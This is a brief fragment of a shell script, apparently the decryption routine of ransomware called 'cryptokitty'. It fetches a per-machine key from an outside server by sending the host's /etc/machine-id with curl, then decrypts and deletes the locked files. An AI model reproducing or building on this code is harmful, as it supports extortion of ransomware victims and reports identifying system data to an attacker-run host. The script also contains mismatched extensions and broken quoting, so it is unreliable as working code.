...
if [[ $1 =~ \.cryptokitty$ ]]; then
  ...
  [ -f $f ] && openssl enc -d -aes-256-cbc -in $f -k "\$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$1)\" -out "$f" && rm "$f.cryptkitty"
fi
